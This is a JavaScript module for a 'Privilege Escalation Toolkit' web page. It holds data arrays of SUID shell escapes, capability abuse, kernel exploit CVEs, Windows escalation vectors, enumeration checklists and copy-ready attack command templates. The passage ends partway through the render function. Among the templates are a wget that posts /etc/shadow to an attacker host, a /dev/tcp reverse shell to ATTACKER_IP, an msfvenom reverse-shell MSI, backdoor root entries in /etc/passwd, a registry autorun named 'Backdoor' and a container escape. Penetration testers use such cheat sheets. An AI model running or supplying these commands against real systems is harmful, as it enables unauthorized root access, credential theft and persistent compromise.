import { esc } from '/js/shared.js';

const PE_SUID_BINS = [
  { bin: 'find', cmd: 'find . -exec /bin/sh -p \\; -quit', note: 'Spawn shell via -exec' },
  { bin: 'vim', cmd: 'vim -c \':!/bin/sh\'', note: 'Shell escape from editor' },
  { bin: 'nmap', cmd: 'nmap --interactive\\nnmap> !sh', note: 'Interactive mode (older versions)' },
  { bin: 'python', cmd: 'python -c \'import os; os.execl("/bin/sh","sh","-p")\'', note: 'Python shell spawn' },
  { bin: 'python3', cmd: 'python3 -c \'import os; os.execl("/bin/sh","sh","-p")\'', note: 'Python3 shell spawn' },
  { bin: 'perl', cmd: 'perl -e \'exec "/bin/sh";\'', note: 'Perl exec' },
  { bin: 'bash', cmd: 'bash -p', note: 'Preserved privileges' },
  { bin: 'less', cmd: 'less /etc/passwd\\n!/bin/sh', note: 'Shell escape from pager' },
  { bin: 'more', cmd: 'more /etc/passwd\\n!/bin/sh', note: 'Shell escape from pager' },
  { bin: 'nano', cmd: 'nano\\n^R^X\\nreset; sh 1>&0 2>&0', note: 'Command execution in nano' },
  { bin: 'awk', cmd: 'awk \'BEGIN {system("/bin/sh")}\'', note: 'System call from awk' },
  { bin: 'env', cmd: 'env /bin/sh -p', note: 'Direct shell via env' },
  { bin: 'cp', cmd: 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash', note: 'Copy and SUID bash' },
  { bin: 'mv', cmd: 'mv /etc/passwd /etc/passwd.bak', note: 'Replace passwd file' },
  { bin: 'tar', cmd: 'tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh', note: 'Checkpoint action' },
  { bin: 'zip', cmd: 'zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/sh"', note: 'Test command injection' },
  { bin: 'gcc', cmd: 'gcc -wrapper /bin/sh,-s .', note: 'Wrapper option' },
  { bin: 'docker', cmd: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh', note: 'Mount host filesystem' },
  { bin: 'strace', cmd: 'strace -o /dev/null /bin/sh', note: 'Trace into shell' },
  { bin: 'ltrace', cmd: 'ltrace -b -L /bin/sh', note: 'Library trace shell' },
  { bin: 'wget', cmd: 'wget --post-file=/etc/shadow http://attacker:8080', note: 'Exfil sensitive files' },
  { bin: 'curl', cmd: 'curl file:///etc/shadow', note: 'Read local files' },
  { bin: 'tee', cmd: 'echo "root2::0:0::/root:/bin/bash" | tee -a /etc/passwd', note: 'Append to passwd' },
  { bin: 'ed', cmd: 'ed\\n!/bin/sh', note: 'Shell escape' },
  { bin: 'sed', cmd: 'sed -n \'1e exec sh 1>&0\' /etc/hosts', note: 'Execute via sed' },
  { bin: 'php', cmd: 'php -r "system(\\"/bin/sh\\");"', note: 'PHP system call' },
  { bin: 'ruby', cmd: 'ruby -e \'exec "/bin/sh"\'', note: 'Ruby exec' },
  { bin: 'lua', cmd: 'lua -e \'os.execute("/bin/sh")\'', note: 'Lua os.execute' },
  { bin: 'node', cmd: 'node -e \'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})\'', note: 'Node child_process' },
  { bin: 'git', cmd: 'git help config\\n!/bin/sh', note: 'Shell escape from pager' },
  { bin: 'ftp', cmd: 'ftp\\n!/bin/sh', note: 'Shell escape' },
  { bin: 'ssh', cmd: 'ssh -o ProxyCommand=";sh 0<&2 1>&2" x', note: 'ProxyCommand injection' },
  { bin: 'scp', cmd: 'scp -S /tmp/shell.sh x y:', note: 'Custom SSH program' },
  { bin: 'mount', cmd: 'mount -o bind /bin/sh /usr/bin/authorized_cmd', note: 'Bind mount shell' },
  { bin: 'pkexec', cmd: 'pkexec /bin/sh', note: 'PolicyKit exec (CVE-2021-4034)' },
  { bin: 'systemctl', cmd: 'systemctl\\n!sh', note: 'Shell escape from pager' },
  { bin: 'journalctl', cmd: 'journalctl\\n!/bin/sh', note: 'Shell escape from pager' },
  { bin: 'taskset', cmd: 'taskset 1 /bin/sh -p', note: 'Run shell with affinity' },
  { bin: 'ionice', cmd: 'ionice /bin/sh -p', note: 'Run shell with ionice' },
  { bin: 'nice', cmd: 'nice /bin/sh -p', note: 'Run shell with nice' },
  { bin: 'time', cmd: '/usr/bin/time /bin/sh -p', note: 'Time a shell' },
  { bin: 'expect', cmd: 'expect -c "spawn /bin/sh -p;interact"', note: 'Expect spawn shell' },
  { bin: 'screen', cmd: 'screen', note: 'Screen may drop to root shell' },
  { bin: 'script', cmd: 'script -qc /bin/sh /dev/null', note: 'Script command shell' },
];

const PE_KERNEL_EXPLOITS = [
  { range: '2.6.22-2.6.36', cve: 'CVE-2009-1185', name: 'udev < 1.4.1', desc: 'Netlink socket crafting for root' },
  { range: '2.6.17-2.6.24', cve: 'CVE-2008-0600', name: 'vmsplice', desc: 'Local root via vmsplice syscall' },
  { range: '2.6.37-3.8.10', cve: 'CVE-2013-2094', name: 'perf_swevent_init', desc: 'perf_event exploit' },
  { range: '3.0-3.19', cve: 'CVE-2015-1328', name: 'OverlayFS', desc: 'OverlayFS privilege escalation' },
  { range: '2.6.22-4.8.3', cve: 'CVE-2016-5195', name: 'Dirty COW', desc: 'Copy-on-write race condition' },
  { range: '4.4-4.13', cve: 'CVE-2017-16995', name: 'eBPF Verifier', desc: 'eBPF verifier bypass' },
  { range: '4.1-4.4', cve: 'CVE-2016-0728', name: 'Keyring Refcount', desc: 'Keyring reference counting bug' },
  { range: '5.8-5.16', cve: 'CVE-2022-0847', name: 'Dirty Pipe', desc: 'Pipe buffer flag manipulation' },
  { range: '5.4-5.11', cve: 'CVE-2021-22555', name: 'Netfilter', desc: 'Netfilter heap OOB write' },
  { range: '5.0-5.10', cve: 'CVE-2021-3156', name: 'Baron Samedit', desc: 'Sudo heap overflow (not kernel but common)' },
  { range: '5.8-5.14', cve: 'CVE-2021-4034', name: 'PwnKit', desc: 'Polkit pkexec local privilege escalation' },
  { range: '5.8-5.18', cve: 'CVE-2022-2588', name: 'Route4 UAF', desc: 'cls_route use-after-free' },
  { range: '5.14-6.1', cve: 'CVE-2023-0386', name: 'OverlayFS (2023)', desc: 'OverlayFS setuid copy-up' },
  { range: '6.1-6.4', cve: 'CVE-2023-32233', name: 'nf_tables UAF', desc: 'Netfilter nf_tables use-after-free' },
];

const PE_CAPS = [
  { cap: 'cap_setuid', risk: 'Critical', desc: 'Can change UID to 0 (root)', cmd: 'python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'' },
  { cap: 'cap_setgid', risk: 'Critical', desc: 'Can change GID to 0 (root)', cmd: 'python3 -c \'import os; os.setgid(0); os.system("/bin/bash")\'' },
  { cap: 'cap_dac_override', risk: 'Critical', desc: 'Bypass file read/write permission checks', cmd: 'Can read/write any file: /etc/shadow, /etc/passwd, SSH keys' },
  { cap: 'cap_dac_read_search', risk: 'High', desc: 'Bypass file read and directory search permissions', cmd: 'Can read any file including /etc/shadow' },
  { cap: 'cap_fowner', risk: 'High', desc: 'Bypass permission checks on file owner', cmd: 'chmod 777 /etc/shadow' },
  { cap: 'cap_chown', risk: 'High', desc: 'Change file ownership arbitrarily', cmd: 'chown attacker:attacker /etc/shadow' },
  { cap: 'cap_net_raw', risk: 'Medium', desc: 'Use RAW and PACKET sockets', cmd: 'Network sniffing, ARP spoofing' },
  { cap: 'cap_net_admin', risk: 'High', desc: 'Network administration operations', cmd: 'Modify routing, firewall rules, interface config' },
  { cap: 'cap_sys_admin', risk: 'Critical', desc: 'Broad admin operations', cmd: 'Mount filesystems, modify namespaces, container escape' },
  { cap: 'cap_sys_ptrace', risk: 'High', desc: 'Trace and modify processes', cmd: 'Inject shellcode into running processes' },
  { cap: 'cap_sys_module', risk: 'Critical', desc: 'Load/unload kernel modules', cmd: 'Load malicious kernel module for root' },
];

const PE_WIN_VECTORS = [
  {
    name: 'Unquoted Service Paths',
    desc: 'Services with spaces in paths and no quotes allow DLL/EXE hijacking',
    check: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """',
    exploit: 'Place malicious executable at each space boundary in the unquoted path'
  },
  {
    name: 'Weak Service Permissions',
    desc: 'Services writable by non-admin users can be reconfigured',
    check: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula\naccesschk.exe -uwcqv "Everyone" * /accepteula',
    exploit: 'sc config <vuln_service> binpath= "C:\\temp\\shell.exe"\nnet stop <vuln_service>\nnet start <vuln_service>'
  },
  {
    name: 'AlwaysInstallElevated',
    desc: 'MSI packages install with SYSTEM privileges when both registry keys are set',
    check: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
    exploit: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi\nmsiexec /quiet /qn /i shell.msi'
  },
  {
    name: 'Token Impersonation',
    desc: 'SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege allow token theft',
    check: 'whoami /priv\n# Look for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege',
    exploit: 'Use PrintSpoofer, JuicyPotato, GodPotato, or SweetPotato\nPrintSpoofer.exe -i -c cmd\nJuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *'
  },
  {
    name: 'DLL Hijacking',
    desc: 'Applications searching for DLLs in writable directories',
    check: 'Use Process Monitor to identify missing DLLs\nFilter: Result = NAME NOT FOUND, Path ends with .dll',
    exploit: 'Place malicious DLL in the application directory or a PATH directory with lower priority'
  },
  {
    name: 'UAC Bypass',
    desc: 'User Account Control can be bypassed via auto-elevating binaries',
    check: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin',
    exploit: 'fodhelper.exe: set HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\neventvwr.exe: set HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command\ncomputerdefaults.exe: similar registry hijack'
  },
  {
    name: 'Scheduled Tasks',
    desc: 'Tasks running as SYSTEM with writable scripts or binaries',
    check: 'schtasks /query /fo LIST /v\n# Check for writable paths in task actions\nicacls "C:\\path\\to\\task\\binary.exe"',
    exploit: 'Replace writable binary with payload, wait for scheduled execution'
  },
  {
    name: 'Registry Autoruns',
    desc: 'Writable registry autorun entries execute on login',
    check: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nautorunsc.exe -a | findstr /n /R "File\\ not\\ found"',
    exploit: 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\temp\\shell.exe"'
  },
];

const PE_LINUX_CHECKLIST = [
  { cat: 'System Enumeration', items: [
    { text: 'Check OS version and kernel', cmd: 'uname -a && cat /etc/os-release' },
    { text: 'List running processes', cmd: 'ps aux --forest' },
    { text: 'Check environment variables', cmd: 'env' },
    { text: 'List network connections', cmd: 'ss -tulnp || netstat -tulnp' },
    { text: 'Check disk mounts', cmd: 'df -h && mount' },
    { text: 'List installed packages', cmd: 'dpkg -l 2>/dev/null || rpm -qa 2>/dev/null' },
  ]},
  { cat: 'User & Permission Enum', items: [
    { text: 'Current user and groups', cmd: 'id && groups' },
    { text: 'Sudo permissions', cmd: 'sudo -l' },
    { text: 'List all users', cmd: 'cat /etc/passwd | grep -v nologin | grep -v false' },
    { text: 'Check /etc/shadow readable', cmd: 'cat /etc/shadow 2>/dev/null' },
    { text: 'Find SUID binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null' },
    { text: 'Find SGID binaries', cmd: 'find / -perm -2000 -type f 2>/dev/null' },
    { text: 'Find capabilities', cmd: 'getcap -r / 2>/dev/null' },
    { text: 'Find writable directories', cmd: 'find / -writable -type d 2>/dev/null' },
  ]},
  { cat: 'Cron & Scheduled Tasks', items: [
    { text: 'Current user crontab', cmd: 'crontab -l 2>/dev/null' },
    { text: 'System crontabs', cmd: 'ls -la /etc/cron* && cat /etc/crontab' },
    { text: 'Find writable cron scripts', cmd: 'find /etc/cron* -writable -type f 2>/dev/null' },
    { text: 'Check systemd timers', cmd: 'systemctl list-timers --all' },
    { text: 'Watch for running processes', cmd: 'watch -n 1 "ps aux | grep -v watch"' },
  ]},
  { cat: 'File System', items: [
    { text: 'Find config files', cmd: 'find / -name "*.conf" -o -name "*.cfg" -o -name "*.cnf" 2>/dev/null | head -50' },
    { text: 'Find SSH keys', cmd: 'find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null' },
    { text: 'Find history files', cmd: 'find / -name ".*_history" -o -name ".bash_history" 2>/dev/null' },
    { text: 'World-writable files', cmd: 'find / -writable -type f 2>/dev/null | grep -v proc' },
    { text: 'Find backup files', cmd: 'find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null' },
    { text: 'Find password files', cmd: 'grep -rl "password" /etc/ 2>/dev/null' },
  ]},
  { cat: 'Network & Services', items: [
    { text: 'Internal services', cmd: 'ss -tulnp | grep 127.0.0.1' },
    { text: 'ARP cache', cmd: 'arp -a || ip neigh' },
    { text: 'Routing table', cmd: 'route -n || ip route' },
    { text: 'DNS resolvers', cmd: 'cat /etc/resolv.conf' },
    { text: 'Firewall rules', cmd: 'iptables -L -n 2>/dev/null || nft list ruleset 2>/dev/null' },
  ]},
  { cat: 'Container / Virtualization', items: [
    { text: 'Check if in container', cmd: 'cat /proc/1/cgroup 2>/dev/null | grep -i docker' },
    { text: 'Docker socket accessible', cmd: 'ls -la /var/run/docker.sock 2>/dev/null' },
    { text: 'Check for privileged mode', cmd: 'cat /proc/self/status | grep -i cap' },
    { text: 'List namespaces', cmd: 'ls -la /proc/self/ns/' },
  ]},
];

const PE_WIN_CHECKLIST = [
  { cat: 'System Info', items: [
    { text: 'OS version and architecture', cmd: 'systeminfo' },
    { text: 'Hostname and domain', cmd: 'hostname && whoami /all' },
    { text: 'Installed patches', cmd: 'wmic qfe list brief' },
    { text: 'Running processes', cmd: 'tasklist /v' },
    { text: 'Installed software', cmd: 'wmic product get name,version' },
  ]},
  { cat: 'User & Privileges', items: [
    { text: 'Current privileges', cmd: 'whoami /priv' },
    { text: 'Current groups', cmd: 'whoami /groups' },
    { text: 'List local users', cmd: 'net user' },
    { text: 'List local admins', cmd: 'net localgroup Administrators' },
    { text: 'Password policy', cmd: 'net accounts' },
  ]},
  { cat: 'Services', items: [
    { text: 'List services', cmd: 'wmic service list brief' },
    { text: 'Unquoted service paths', cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\\windows"' },
    { text: 'Service permissions', cmd: 'accesschk.exe -uwcqv * /accepteula' },
    { text: 'Running services', cmd: 'net start' },
  ]},
  { cat: 'Network', items: [
    { text: 'Network config', cmd: 'ipconfig /all' },
    { text: 'Active connections', cmd: 'netstat -ano' },
    { text: 'Routing table', cmd: 'route print' },
    { text: 'Firewall state', cmd: 'netsh advfirewall show allprofiles' },
    { text: 'Shared resources', cmd: 'net share' },
  ]},
  { cat: 'Registry & Files', items: [
    { text: 'Autorun entries', cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
    { text: 'AlwaysInstallElevated', cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
    { text: 'Saved credentials', cmd: 'cmdkey /list' },
    { text: 'Unattend files', cmd: 'dir /s /b C:\\unattend.xml C:\\sysprep.xml 2>nul' },
    { text: 'SAM/SYSTEM backups', cmd: 'dir /s /b C:\\windows\\repair\\SAM C:\\windows\\repair\\SYSTEM 2>nul' },
  ]},
];

const PE_CMD_TEMPLATES = [
  {
    cat: 'SUID Exploitation',
    cmds: [
      { name: 'Find all SUID binaries', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
      { name: 'Find all SGID binaries', cmd: 'find / -perm -g=s -type f 2>/dev/null' },
      { name: 'Check binary on GTFOBins', cmd: '# Visit https://gtfobins.github.io/#+suid and search for the binary' },
      { name: 'Create SUID copy of bash', cmd: 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p' },
    ]
  },
  {
    cat: 'Sudo Abuse',
    cmds: [
      { name: 'Check sudo permissions', cmd: 'sudo -l' },
      { name: 'Sudo with LD_PRELOAD', cmd: '# Compile: gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles\n# pe.c: void _init() { setuid(0); system("/bin/bash -p"); }\nsudo LD_PRELOAD=/tmp/pe.so <allowed_command>' },
      { name: 'Sudo env_keep+=LD_PRELOAD', cmd: '# If env_keep contains LD_PRELOAD:\nsudo LD_PRELOAD=/tmp/pe.so find' },
      { name: 'Sudo with NOPASSWD', cmd: '# If user can run something with NOPASSWD:\nsudo <command>' },
    ]
  },
  {
    cat: 'Cron Job Abuse',
    cmds: [
      { name: 'Monitor cron jobs', cmd: '# Use pspy:\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64\nchmod +x pspy64 && ./pspy64' },
      { name: 'Writable cron script', cmd: 'echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/cron/script.sh' },
      { name: 'Cron PATH abuse', cmd: '# If cron uses relative path:\necho "#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /home/user/scriptname\nchmod +x /home/user/scriptname' },
      { name: 'Wildcard injection (tar)', cmd: '# If cron runs: tar czf backup.tar.gz *\necho "" > "--checkpoint=1"\necho "" > "--checkpoint-action=exec=sh shell.sh"' },
    ]
  },
  {
    cat: 'Capabilities Abuse',
    cmds: [
      { name: 'Find all capabilities', cmd: 'getcap -r / 2>/dev/null' },
      { name: 'Python cap_setuid', cmd: '/usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'' },
      { name: 'Perl cap_setuid', cmd: '/usr/bin/perl -e \'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";\'' },
      { name: 'PHP cap_setuid', cmd: '/usr/bin/php -r "posix_setuid(0); system(\\"/bin/bash\\");"' },
    ]
  },
  {
    cat: 'Docker / Container Escape',
    cmds: [
      { name: 'Docker socket mount', cmd: 'docker run -it -v /:/host/ ubuntu chroot /host/ bash' },
      { name: 'Privileged container escape', cmd: 'mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=$(sed -n \'s/.*\\perdir=\\([^,]*\\).*/\\1/p\' /etc/mtab)\necho "$host_path/cmd" > /tmp/cgrp/release_agent\necho "#!/bin/sh" > /cmd\necho "cat /etc/shadow > $host_path/output" >> /cmd\nchmod a+x /cmd\nsh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"' },
      { name: 'nsenter escape', cmd: 'nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash' },
      { name: 'Check if privileged', cmd: 'ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link delete dummy0 || echo "NOT privileged"' },
    ]
  },
  {
    cat: 'PATH Injection',
    cmds: [
      { name: 'Identify vulnerable binary', cmd: '# If a SUID binary calls a command without full path:\nstrings /usr/local/bin/suid_binary | grep -E "^[a-z]"' },
      { name: 'Hijack PATH', cmd: 'echo "/bin/bash -p" > /tmp/service\nchmod +x /tmp/service\nexport PATH=/tmp:$PATH\n/usr/local/bin/suid_binary' },
    ]
  },
  {
    cat: 'Windows Token Impersonation',
    cmds: [
      { name: 'Check privileges', cmd: 'whoami /priv' },
      { name: 'PrintSpoofer', cmd: 'PrintSpoofer.exe -i -c "cmd /c whoami"' },
      { name: 'GodPotato', cmd: 'GodPotato.exe -cmd "cmd /c whoami"' },
      { name: 'JuicyPotato', cmd: 'JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}' },
      { name: 'SweetPotato', cmd: 'SweetPotato.exe -p c:\\windows\\system32\\cmd.exe -a "/c whoami"' },
    ]
  },
  {
    cat: 'Windows Service Exploitation',
    cmds: [
      { name: 'Find unquoted paths', cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows" | findstr /i /v \\\"' },
      { name: 'Check service permissions', cmd: 'sc qc <service_name>\naccesschk.exe /accepteula -uwcqv <user> <service_name>' },
      { name: 'Reconfigure service', cmd: 'sc config <service> binpath= "C:\\temp\\shell.exe"\nsc stop <service>\nsc start <service>' },
      { name: 'Replace service binary', cmd: 'icacls "C:\\path\\to\\service.exe"\ncopy /Y C:\\temp\\shell.exe "C:\\path\\to\\service.exe"\nnet stop <service> && net start <service>' },
    ]
  },
];

const PE_REFS = [
  { name: 'GTFOBins', url: 'https://gtfobins.github.io/', desc: 'Unix binaries for privilege escalation' },
  { name: 'LOLBAS', url: 'https://lolbas-project.github.io/', desc: 'Living Off the Land Windows binaries' },
  { name: 'PayloadsAllTheThings', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', desc: 'Useful payloads and bypass techniques' },
  { name: 'HackTricks', url: 'https://book.hacktricks.xyz/', desc: 'Comprehensive pentesting methodology' },
  { name: 'LinPEAS', url: 'https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS', desc: 'Linux privilege escalation automation' },
  { name: 'WinPEAS', url: 'https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS', desc: 'Windows privilege escalation automation' },
  { name: 'linux-exploit-suggester', url: 'https://github.com/mzet-/linux-exploit-suggester', desc: 'Kernel exploit suggester' },
  { name: 'Windows Exploit Suggester', url: 'https://github.com/AonCyberLabs/Windows-Exploit-Suggester', desc: 'Windows exploit finder from systeminfo' },
  { name: 'pspy', url: 'https://github.com/DominicBreuker/pspy', desc: 'Monitor processes without root' },
  { name: 'Chisel', url: 'https://github.com/jpillora/chisel', desc: 'TCP/UDP tunnel over HTTP' },
  { name: 'PEASS-ng', url: 'https://github.com/carlospolop/PEASS-ng', desc: 'Privilege Escalation Awesome Scripts Suite' },
];

export function renderPrivescToolkit(container) {
  const checkedItems = new Set();
  let activeTab = 'linux';
  let activeLinuxSub = 'suid';
  let activeWinSub = 'vectors';
  let cmdCat = PE_CMD_TEMPLATES[0].cat;

  container.innerHTML = `<div class="pe-wrap"><style>
.pe-wrap{background:#0a0e14;color:#c8d6e5;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
.pe-header{background:linear-gradient(135deg,#0c1020 0%,#1a0a2e 50%,#0a1628 100%);padding:20px 28px;border-bottom:1px solid #2a1a4a}
.pe-header h2{margin:0;font-size:22px;color:#bf7fff;letter-spacing:1px}
.pe-header p{margin:4px 0 0;font-size:13px;color:#8a6abf;opacity:.8}
.pe-tabs{display:flex;gap:0;background:#0c1020;border-bottom:1px solid #1a2a44;overflow-x:auto}
.pe-tab{padding:12px 22px;background:none;border:none;color:#6a8aaa;font-size:13px;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:all .2s}
.pe-tab:hover{color:#bf7fff;background:rgba(191,127,255,.05)}
.pe-tab.active{color:#bf7fff;border-bottom-color:#bf7fff;background:rgba(191,127,255,.08)}
.pe-content{padding:20px 24px}
.pe-sub-tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}
.pe-sub-tab{padding:6px 14px;background:#111828;border:1px solid #1e293b;border-radius:6px;color:#8ab4d0;font-size:12px;cursor:pointer;transition:all .2s}
.pe-sub-tab:hover{border-color:#bf7fff;color:#bf7fff}
.pe-sub-tab.active{background:#1a0a2e;border-color:#bf7fff;color:#bf7fff}
.pe-card{background:#111828;border:1px solid #1e293b;border-radius:8px;margin-bottom:12px;overflow:hidden}
.pe-card-head{padding:12px 16px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:background .2s}
.pe-card-head:hover{background:rgba(191,127,255,.05)}
.pe-card-title{font-size:14px;font-weight:600;color:#e2e8f0}
.pe-card-risk{font-size:11px;padding:2px 8px;border-radius:4px;font-weight:600;text-transform:uppercase}
.pe-card-risk.critical{background:rgba(255,23,68,.15);color:#ff1744}
.pe-card-risk.high{background:rgba(255,145,0,.15);color:#ff9100}
.pe-card-risk.medium{background:rgba(255,214,0,.15);color:#ffd600}
.pe-card-risk.low{background:rgba(0,230,118,.15);color:#00e676}
.pe-card-body{padding:0 16px 14px;font-size:13px;color:#8ab4d0;line-height:1.6}
.pe-cmd{background:#080c14;border:1px solid #1a2a44;border-radius:6px;padding:10px 14px;margin:8px 0;font-family:'JetBrains Mono',monospace;font-size:12px;color:#00ff88;white-space:pre-wrap;word-break:break-all;position:relative}
.pe-cmd .pe-copy{position:absolute;top:6px;right:8px;background:#1a2a44;border:none;color:#8ab4d0;padding:3px 8px;border-radius:4px;font-size:10px;cursor:pointer}
.pe-cmd .pe-copy:hover{background:#bf7fff;color:#fff}
.pe-note{color:#6a8aaa;font-size:12px;margin-top:4px}
.pe-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:12px}
.pe-input{background:#0c1020;border:1px solid #1e293b;border-radius:6px;padding:10px 14px;color:#e2e8f0;font-size:14px;width:100%;box-sizing:border-box;font-family:'JetBrains Mono',monospace}
.pe-input:focus{outline:none;border-color:#bf7fff;box-shadow:0 0 0 2px rgba(191,127,255,.15)}
.pe-btn{background:#bf7fff;color:#fff;border:none;padding:8px 18px;border-radius:6px;font-size:13px;cursor:pointer;font-weight:600;transition:all .2s}
.pe-btn:hover{background:#a855f7;transform:translateY(-1px)}
.pe-btn-sm{padding:5px 12px;font-size:11px}
.pe-checklist-group{margin-bottom:20px}
.pe-checklist-group h3{font-size:15px;color:#bf7fff;margin:0 0 10px;padding-bottom:6px;border-bottom:1px solid #1e293b}
.pe-check-item{display:flex;align-items:flex-start;gap:10px;padding:8px 12px;border-radius:6px;cursor:pointer;transition:background .2s}
.pe-check-item:hover{background:rgba(191,127,255,.05)}
.pe-check-item.done{opacity:.5}
.pe-check-box{width:18px;height:18px;border:2px solid #3a5a7a;border-radius:4px;flex-shrink:0;margin-top:1px;display:flex;align-items:center;justify-content:center;transition:all .2s;font-size:11px;color:transparent}
.pe-check-item.done .pe-check-box{background:#00e676;border-color:#00e676;color:#000}
.pe-check-text{font-size:13px;color:#c8d6e5}
.pe-check-cmd{font-size:11px;color:#6a8aaa;font-family:'JetBrains Mono',monospace;margin-top:2px}
.pe-progress{display:flex;align-items:center;gap:12px;margin-bottom:16px;padding:12px 16px;background:#111828;border-radius:8px;border:1px solid #1e293b}
.pe-progress-bar{flex:1;height:8px;background:#1a2a44;border-radius:4px;overflow:hidden}
.pe-progress-fill{height:100%;background:linear-gradient(90deg,#bf7fff,#00e676);border-radius:4px;transition:width .3s}
.pe-progress-text{font-size:13px;color:#8ab4d0;white-space:nowrap}
.pe-ref-card{display:flex;align-items:center;gap:14px;padding:14px 18px;background:#111828;border:1px solid #1e293b;border-radius:8px;transition:all .2s}
.pe-ref-card:hover{border-color:#bf7fff;transform:translateY(-2px);box-shadow:0 4px 12px rgba(191,127,255,.1)}
.pe-ref-name{font-size:14px;font-weight:600;color:#bf7fff}
.pe-ref-url{font-size:11px;color:#3a5a7a;font-family:'JetBrains Mono',monospace;word-break:break-all}
.pe-ref-desc{font-size:12px;color:#8ab4d0;margin-top:2px}
.pe-section-label{font-size:12px;color:#bf7fff;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px;font-weight:600}
.pe-kernel-results{margin-top:12px}
.pe-kernel-match{background:#111828;border:1px solid #1e293b;border-radius:8px;padding:14px 18px;margin-bottom:10px;border-left:3px solid #ff1744}
.pe-kernel-match h4{margin:0 0 4px;color:#ff9100;font-size:14px}
.pe-kernel-match .pe-cve{color:#ff1744;font-family:'JetBrains Mono',monospace;font-size:12px}
.pe-kernel-match .pe-range{color:#6a8aaa;font-size:12px}
.pe-kernel-match p{margin:6px 0 0;color:#8ab4d0;font-size:13px}
.pe-cmd-gen-grid{display:grid;grid-template-columns:220px 1fr;gap:16px;min-height:400px}
.pe-cmd-list{background:#0c1020;border:1px solid #1e293b;border-radius:8px;overflow:hidden}
.pe-cmd-cat{padding:10px 14px;cursor:pointer;color:#8ab4d0;font-size:13px;border-bottom:1px solid #1a2a44;transition:all .2s}
.pe-cmd-cat:hover{background:rgba(191,127,255,.05);color:#bf7fff}
.pe-cmd-cat.active{background:#1a0a2e;color:#bf7fff;border-left:3px solid #bf7fff}
.pe-cmd-detail{background:#111828;border:1px solid #1e293b;border-radius:8px;padding:16px}
.pe-cmd-entry{margin-bottom:16px;padding-bottom:16px;border-bottom:1px solid #1a2a44}
.pe-cmd-entry:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
.pe-cmd-entry h4{margin:0 0 6px;color:#e2e8f0;font-size:14px}
@media(max-width:768px){.pe-grid{grid-template-columns:1fr}.pe-cmd-gen-grid{grid-template-columns:1fr}.pe-content{padding:14px 12px}}
</style>
<div class="pe-header">
  <h2>&#x1f510; PRIVILEGE ESCALATION TOOLKIT</h2>
  <p>Linux &amp; Windows privesc vectors, checklists, and command generators</p>
</div>
<div class="pe-tabs">
  <button class="pe-tab active" data-tab="linux">Linux</button>
  <button class="pe-tab" data-tab="windows">Windows</button>
  <button class="pe-tab" data-tab="checklist">Checklist</button>
  <button class="pe-tab" data-tab="cmdgen">Command Gen</button>
  <button class="pe-tab" data-tab="reference">Reference</button>
</div>
<div class="pe-content" id="pe-content"></div>
</div>`;

  const wrap = container.querySelector('.pe-wrap');
  const content = wrap.querySelector('#pe-content');

